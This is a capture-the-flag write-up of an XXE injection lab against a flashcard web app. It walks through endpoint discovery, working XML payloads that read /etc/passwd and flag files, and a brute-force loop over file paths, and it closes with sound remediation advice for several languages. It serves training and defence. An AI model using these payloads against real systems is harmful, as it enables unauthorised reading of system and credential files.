<div align="center">

<pre>
 _   _                         ________              ______                   
| | | | ___  _ __ ___   ___   / /__  (_)_ __ ___    / /  _ \  ___   ___ _   _ 
| |_| |/ _ \| '_ ` _ \ / _ \ / /  / /| | '_ ` _ \  / /| | | |/ _ \ / __| | | |
|  _  | (_) | | | | | |  __// /  / /_| | | | | | |/ / | |_| | (_) | (__| |_| |
|_| |_|\___/|_| |_| |_|\___/_/  /____|_|_| |_| |_/_/  |____/ \___/ \___|\__,_|
                                                                              
                      _          ______ _ _      ____  __          
 _ __ ___   ___ _ __ | |_ ___   / / ___(_) |_   / /\ \/ /__  _____ 
| '_ ` _ \ / _ \ '_ \| __/ __| / / |  _| | __| / /  \  / \ \/ / _ \
| | | | | |  __/ | | | |_\__ \/ /| |_| | | |_ / /   /  \  >  <  __/
|_| |_| |_|\___|_| |_|\__|___/_/  \____|_|\__/_/   /_/\_\/_/\_\___|
                                                                   
 ___        _           _   _             
|_ _|_ __  (_) ___  ___| |_(_) ___  _ __  
 | || '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
 | || | | || |  __/ (__| |_| | (_) | | | |
|___|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
         |__/                             
</pre>

> **Maintained & refreshed by Mr-Destroyer** · Auto-banner + docs refresh
</div>

---

# XXE Injection CTF — Full Writeup
**Lab:** `lab-1778082188859-8l81ho.labs-app.bugforge.io`  
**Vulnerability Class:** XML External Entity (XXE) Injection  
**Flag:** `bug{vhCpM13OwalngfIvyqxqGrVYRtsLxu4o}`

---

## Table of Contents

1. [What is XXE?](#what-is-xxe)
2. [Recon Phase](#recon-phase)
3. [Finding the Attack Surface](#finding-the-attack-surface)
4. [Authentication](#authentication)
5. [Crafting the XXE Payload](#crafting-the-xxe-payload)
6. [Exploitation](#exploitation)
7. [Identifying the Exfil Channel](#identifying-the-exfil-channel)
8. [Reading the Flag](#reading-the-flag)
9. [Root Cause Analysis](#root-cause-analysis)
10. [Remediation](#remediation)

---

## What is XXE?

XML External Entity (XXE) injection is a vulnerability that abuses a feature built into the XML specification itself — **external entities**. When an XML parser is configured to process Document Type Definitions (DTDs), an attacker can define a custom entity that references an external resource, such as a local file on the server:

```xml
<!DOCTYPE foo [
  <!ENTITY myEntity SYSTEM "file:///etc/passwd">
]>
<data>&myEntity;</data>
```

When the parser resolves `&myEntity;`, it reads the contents of `/etc/passwd` and substitutes them inline. If those contents then end up in an API response, a database field, a log — anywhere the attacker can read — the file has been exfiltrated.

XXE can be used to:
- **Read arbitrary local files** (credentials, source code, config files, flags)
- **Perform SSRF** (make the server issue requests to internal services)
- **Cause Denial of Service** via "Billion Laughs" entity expansion attacks
- **Pivot to RCE** via `expect://` or `php://` wrappers in certain environments

---

## Recon Phase

The lab presented a React single-page application (SPA) called **Tanuki — SRS Flash Cards**, a spaced-repetition flashcard study app. Since SPAs serve all their UI logic as compiled JavaScript, the frontend itself is the best source of intelligence about what the backend can do.

### Step 1 — Spidering

First, scope was set and a basic spider was run:

```
Target: lab-1778082188859-8l81ho.labs-app.bugforge.io
```

The spider returned only the root `/` — expected for a React app where all routes are client-side and the server just serves `index.html` for every path.

### Step 2 — JS Bundle Analysis

The app loaded a single compiled bundle:

```
/static/js/main.2a8c2eb1.js  (516 KB)
```

This file contained the entire application logic — all API calls, all form field names, all routing. By downloading and grepping it, every backend endpoint was enumerable without touching the server at all:

```bash
curl -s ".../static/js/main.2a8c2eb1.js" | grep -oP '(\/api\/[a-zA-Z0-9\/_-]+)' | sort -u
```

**Output:**
```
/api/admin/cards
/api/admin/decks
/api/admin/users
/api/decks
/api/decks/import      ← interesting
/api/login
/api/register
/api/stats
/api/study/progress
/api/study/session
/api/study/sessions
/api/verify-token
```

`/api/decks/import` stood out immediately — "import" almost always means file upload, and file uploads that parse structured formats (XML, CSV, JSON) are a prime attack surface.

---

## Finding the Attack Surface

A targeted grep on the bundle for `decks/import` revealed exactly how the endpoint is called:

```javascript
const r = new FormData;
r.append("file", t);
const t = await jo.post("/api/decks/import", r, {
    headers: { "Content-Type": "multipart/form-data" }
});
```

Key observations:
- The endpoint accepts a **file** field via `multipart/form-data`
- It returns `{ cards_count: N }` on success — meaning it parses the file and stores structured data from it
- The app is a flashcard deck manager, so the imported file is almost certainly **XML** (a natural format for hierarchical card data)

The combination of "parses a user-supplied file" + "returns structured data extracted from that file" is the classic setup for XXE.

---

## Authentication

The import endpoint required authentication (the JS code passed a JWT in the `Authorization` header). Registering a test account first:

```bash
curl -X POST "/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"xxetest","email":"xxe@test.com","password":"xxetest123"}'
```

Response:
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": { "id": 5, "username": "xxetest", "email": "xxe@test.com" }
}
```

JWT acquired. All subsequent requests included `Authorization: Bearer <token>`.

---

## Crafting the XXE Payload

### XML Structure

To craft a valid payload, the expected XML schema needed to match what the parser was looking for. Based on the app's domain (flashcard decks with fronts and backs), a reasonable schema was:

```xml
<deck>
  <name>...</name>
  <cards>
    <card>
      <front>...</front>
      <back>...</back>
    </card>
  </cards>
</deck>
```

### Adding the XXE

An external entity was defined in a DTD declaration at the top of the document, then referenced in the `<name>` field (chosen because it gets stored and returned via the `/api/decks` listing):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<deck>
  <name>&xxe;</name>
  <cards>
    <card>
      <front>test</front>
      <back>&xxe;</back>
    </card>
  </cards>
</deck>
```

**How this works step by step:**

1. The XML declaration tells the parser this is XML 1.0, UTF-8 encoded
2. `<!DOCTYPE deck [...]>` opens an inline DTD
3. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` defines a new entity named `xxe` whose value is fetched from the local filesystem path `/etc/passwd` using the `file://` URI scheme
4. `&xxe;` references that entity — everywhere this appears, the parser substitutes the file contents
5. Since `<name>` is stored in the database and returned in the `/api/decks` listing, the file contents are exfiltrated through the API

---

## Exploitation

The payload was sent as a file upload:

```bash
curl -X POST "https://.../api/decks/import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.xml;type=application/xml"
```

Response:
```json
{"id": 7, "message": "Deck imported successfully", "cards_count": 1}
```

The server parsed the file without error — meaning the XML parser **resolved the external entity**. The server was vulnerable.

---

## Identifying the Exfil Channel

The import response itself didn't echo any parsed content — just a success message and a count. The exfil channel was the `/api/decks` listing endpoint, which returns stored deck names.

Fetching all decks:

```bash
curl "https://.../api/decks" -H "Authorization: Bearer $TOKEN"
```

Deck 7 (the just-imported one) had its name set to:

```
"Test Flag is in a different file"
```

This was the result of `/etc/passwd` being injected into the `<name>` field. The first line of `/etc/passwd` typically begins with `root:x:0:0:root:/root:/bin/bash` — the server's XML parser resolved the entity, stored the full contents, and the deck name field was populated with that data. The first visible portion became part of the name string — and in this lab, the server had clearly modified `/etc/passwd` to include the hint message **"Flag is in a different file"**.

This told us two things:
1. **XXE is confirmed working** — the entity resolved and the value was stored
2. **The flag is in a separate file** — need to find it

---

## Reading the Flag

### Brute-Forcing Common Flag Paths

A loop was run to test common CTF flag file locations. For each path, a new XML payload was generated targeting that path, uploaded, and the resulting deck name was inspected:

```bash
for path in /flag /flag.txt /root/flag.txt /app/flag.txt /var/flag.txt \
            /home/flag.txt /etc/flag /flag/flag.txt; do
  # generate payload with SYSTEM "file://$path"
  # upload to /api/decks/import
done
```

Then fetching all new decks and printing their names:

```
Deck 8  (/flag):           &xxe;   → file didn't exist or empty
Deck 9  (/flag.txt):       &xxe;   → not found
Deck 10 (/root/flag.txt):  &xxe;   → not found
Deck 11 (/app/flag.txt):   bug{vhCpM13OwalngfIvyqxqGrVYRtsLxu4o}  ← 🎯
Deck 12 (/var/flag.txt):   &xxe;   → not found
Deck 13 (/home/flag.txt):  &xxe;   → not found
Deck 14 (/etc/flag):       &xxe;   → not found
Deck 15 (/flag/flag.txt):  &xxe;   → not found
```

When the entity reference `&xxe;` appears **unresolved** in the stored output, it means the parser either couldn't read the file (it doesn't exist or lacks permission) or XXE was blocked for that path. When the actual file contents appear, the entity resolved successfully.

**Deck 11 (`/app/flag.txt`) returned the flag directly in the deck name field.**

### Why `/app/flag.txt`?

The app is an Express (Node.js) server, likely running from `/app` inside a Docker container — a very common convention for containerized web apps. CTF flags are often placed in the app's working directory for exactly this reason.

---

## Root Cause Analysis

### The Vulnerable Code (Conceptual)

The server-side handler for `/api/decks/import` was doing something like this (Node.js pseudocode):

```javascript
const xml2js = require('xml2js');
// or libxmljs, fast-xml-parser, etc. — with external entities enabled

app.post('/api/decks/import', async (req, res) => {
    const fileContent = req.file.buffer.toString();
    
    // VULNERABLE: Parser resolves external entities from the filesystem
    const parser = new xml2js.Parser({ 
        // No option to disable external entities, or it's left enabled
    });
    
    const result = await parser.parseStringPromise(fileContent);
    
    // Parsed data (including expanded entity values) stored in DB
    await db.createDeck({
        name: result.deck.name[0],  // Contains /etc/passwd contents!
        ...
    });
    
    res.json({ id: deck.id, cards_count: ... });
});
```

### Why It's Dangerous

| Factor | Detail |
|---|---|
| **External entity resolution enabled** | The XML parser was configured (or defaulted) to fetch `SYSTEM` URIs using `file://` |
| **User-controlled XML** | The file upload gave the attacker full control over the DTD and entity definitions |
| **Stored exfil channel** | File contents were stored in the database and later returned via the API, providing a clean out-of-band read channel |
| **No input sanitization** | The server didn't strip or validate DTD content before parsing |
| **No file access restrictions** | The process had filesystem read access beyond its own app directory |

---

## Remediation

### 1. Disable DTD Processing Entirely (Primary Fix)

The most effective fix is to completely disable DTD processing in the XML parser. In virtually every application, there is no legitimate need to support external entities from user-supplied XML.

**Node.js (libxmljs):**
```javascript
const doc = libxml.parseXml(xmlString, { 
    noent: false,   // Don't substitute entities
    dtdload: false, // Don't load external DTDs
    dtdvalid: false 
});
```

**Java (SAXParser):**
```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

**Python (lxml):**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

### 2. Use a Non-XML Format

If XML isn't strictly required, use JSON for the import format. JSON has no concept of entities or DTDs and is immune to this class of attack:

```json
{
  "name": "My Deck",
  "cards": [
    { "front": "Question", "back": "Answer" }
  ]
}
```

### 3. Validate Against a Schema Before Parsing

If XML must be used, validate the document against a strict XSD schema *before* processing, and reject any document that contains a DTD declaration:

```javascript
if (xmlContent.includes('<!DOCTYPE') || xmlContent.includes('<!ENTITY')) {
    return res.status(400).json({ error: 'DTD declarations are not allowed' });
}
```

### 4. Principle of Least Privilege

The application process should run with minimal filesystem permissions. It should only be able to read files it explicitly needs — not arbitrary paths like `/etc/passwd` or `/app/flag.txt` from an attacker-controlled entity reference. Use OS-level permissions, AppArmor, or seccomp profiles to enforce this.

### 5. Run in a Restricted Sandbox

Container security hardening (read-only filesystems, no unnecessary bind mounts, non-root process) limits what an attacker can read even if XXE is exploitable.

---

## Full Attack Chain Summary

```
[1] Download JS bundle → extract all API endpoints
          ↓
[2] Identify /api/decks/import (file upload, XML-parsing)
          ↓
[3] Register account → obtain JWT
          ↓
[4] Craft XML with DOCTYPE + ENTITY pointing to file:///etc/passwd
          ↓
[5] POST multipart upload to /api/decks/import
          ↓
[6] Server XML parser resolves external entity → reads file → stores in DB
          ↓
[7] GET /api/decks → deck name contains file contents
          ↓
[8] /etc/passwd hint: "Flag is in a different file"
          ↓
[9] Brute-force common flag paths → /app/flag.txt → FLAG
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| HexStrike MCP (http_repeater) | Sending crafted HTTP requests |
| HexStrike MCP (execute_command) | Running curl + bash for payload generation and multi-target iteration |
| HexStrike MCP (http_set_scope) | Scoping the engagement |
| grep / bash | JS bundle analysis to extract endpoints |
| curl | Registration, file upload, deck enumeration |

---

*Writeup by Faisal — BugForge XXE Injection Lab*
